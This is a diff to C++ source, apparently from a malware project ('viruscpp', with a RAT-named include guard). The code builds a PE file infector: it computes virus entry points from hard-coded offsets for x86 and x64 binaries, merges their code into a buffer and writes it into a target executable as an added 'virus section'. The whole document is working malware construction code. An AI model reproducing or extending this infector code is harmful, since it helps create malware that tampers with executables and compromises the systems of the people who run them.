@@ -1,3 +1,6 @@
+#ifndef RAT_COMMAND_CLIENTCMD_H_
+#define RAT_COMMAND_CLIENTCMD_H_
+
 #include "viruscpp.h"
 
 #include <filesystem>
@@ -6,6 +9,9 @@
 #include <vector>
 
 using namespace std;
+
+#define MAIN_ENTRY_POINT_X86 0xca0
+#define MAIN_ENTRY_POINT_X64 0xaf0
 
 int main(int argc, char *argv[]) {
 
@@ -26,8 +32,9 @@ int main(int argc, char *argv[]) {
 
 	pe::SECTION code_section_x86 = file_x86.GetCodeSectionOfEntryPoint();
 	pe::SECTION code_section_x64 = file_x64.GetCodeSectionOfEntryPoint();
-	DWORD virus_entry_point_x86 = file_x86.GetEntryPoint() - code_section_x86.header.VirtualAddress + 8;
-	DWORD virus_entry_point_x64 = file_x64.GetEntryPoint() - code_section_x64.header.VirtualAddress + 8;
+
+	DWORD virus_entry_point_x86 = MAIN_ENTRY_POINT_X86 + 8;
+	DWORD virus_entry_point_x64 = MAIN_ENTRY_POINT_X64 + 8 + code_section_x86.header.SizeOfRawData;
 	
     vector<unsigned char> merge(8);
 
@@ -42,3 +49,5 @@ int main(int argc, char *argv[]) {
 	virus_file.AddVirusSection(merge);
 	virus_file.FlushChange();
 }
+
+#endif
